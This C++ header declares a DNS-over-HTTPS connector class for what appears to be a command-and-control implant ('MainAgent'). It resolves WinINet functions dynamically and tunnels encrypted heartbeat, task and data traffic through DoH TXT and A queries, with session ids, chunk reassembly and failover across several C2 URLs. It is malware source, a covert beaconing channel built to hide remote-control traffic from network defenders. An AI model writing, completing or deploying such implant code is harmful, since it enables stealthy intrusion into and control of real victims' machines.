#pragma once

#include "AgentConfig.h"
#include <windows.h>
#include <wininet.h>

#define DECL_API(x) decltype(x) * x

struct DOH_HTTP_FUNC {
    DECL_API(LocalAlloc);
    DECL_API(LocalReAlloc);
    DECL_API(LocalFree);
    DECL_API(LoadLibraryA);
    DECL_API(GetProcAddress);
    DECL_API(GetLastError);

    DECL_API(InternetOpenA);
    DECL_API(InternetConnectA);
    DECL_API(HttpOpenRequestA);
    DECL_API(HttpSendRequestA);
    DECL_API(InternetSetOptionA);
    DECL_API(InternetQueryOptionA);
    DECL_API(HttpQueryInfoA);
    DECL_API(InternetQueryDataAvailable);
    DECL_API(InternetCloseHandle);
    DECL_API(InternetReadFile);
};

class ConnectorDoH
{
private:
    ProfileDoH profile = { 0 };
    DOH_HTTP_FUNC* functions = NULL;
    HINTERNET hInternet = NULL;
    HINTERNET hConnect  = NULL;

    // cached session/transport parameters
    CHAR  sid[17] = { 0 };       
    BYTE  encryptKey[16] = { 0 };
    ULONG pktSize = 0;
    ULONG labelSize = 0;
    CHAR  domain[256] = { 0 };
    
    // Multi-URL support
    CHAR  rawUrls[2048] = { 0 }; // Storage for the full string
    CHAR* urlList[16] = { 0 };   // Pointers to individual URLs in rawUrls
    ULONG urlCount = 0;
    ULONG currentUrlIndex = 0;
    ULONG connectedUrlIndex = 0xFFFFFFFF; // Track which URL the current hConnect is for (connection reuse)
    ULONG urlFailCount[16] = { 0 };
    ULONG urlDisabledUntil[16] = { 0 };

    BOOL  initialized = FALSE;
    BOOL  hiSent = FALSE;
    BYTE* hiBeat = NULL;
    ULONG hiBeatSize = 0;
    ULONG hiRetries = 3;
    ULONG hiRetryDelayMs = 0;
    ULONG hiNextAttemptTick = 0;
    ULONG seq = 0;
    ULONG idx = 0;

    BYTE* recvData = NULL;
    int   recvSize = 0;

    // downlink reassembly buffer
    BYTE* downBuf    = NULL;
    ULONG downTotal  = 0;
    ULONG downFilled = 0;
    ULONG downAckOffset = 0; // last acknowledged offset for ACK mechanism
    ULONG downTaskNonce = 0; // unique nonce for current task batch (detect new task)
    ULONG lastDownTotal   = 0;
    ULONG lastUpTotal     = 0;

    // Indicates whether the last DoH query (HI/PUT/GET) completed successfully
    // from the connector's perspective (HTTP request + DNS parse both OK).
    BOOL  lastQueryOk     = FALSE;

public:
    ConnectorDoH();
    // IMPORTANT:
    // Do NOT free `functions` or call CloseConnector() inside the destructor.
    //
    // MainAgent allocates the connector with MemAllocLocal and then does
    //   *g_Connector = ConnectorDoH();
    // This uses a temporary ConnectorDoH object whose destructor runs
    // immediately after the assignment. If the destructor frees shared
    // resources (like the DOH_HTTP_FUNC block), the real g_Connector instance
    // will be left holding dangling pointers, leading to subtle memory
    // corruption and crashes when WinINet APIs are later invoked.
    ~ConnectorDoH();

    BOOL SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize);
    void CloseConnector();

    void  SendData(BYTE* data, ULONG data_size);
    BYTE* RecvData();
    int   RecvSize();
    void  RecvClear();
    void  ReportProtocolResult(BOOL success);

    ULONG GetLastUpTotal() const { return lastUpTotal; }
    ULONG GetLastDownTotal() const { return lastDownTotal; }
    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
    // IsBusy: TRUE if we're in the middle of a multi-chunk download OR heartbeat indicated pending tasks
    BOOL  IsBusy() const;
    ULONG GetDownAckOffset() const { return downAckOffset; }

    BOOL  WasLastQueryOk() const { return lastQueryOk; }

    const BYTE* GetUrls() const { return profile.urls; }
    void        UpdateUrls(BYTE* urls);

private:
    BOOL  hasPendingTasks = FALSE; // Set when heartbeat says "has tasks" but GET hasn't completed yet
	BOOL  forcePoll = FALSE;       // Force a GET poll (ignore heartbeat hasTasks signal)

public:
	void  ForcePollOnce() { this->forcePoll = TRUE; }
    BOOL  DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    BOOL  DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    BOOL  PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** outData, ULONG* outLen);
};
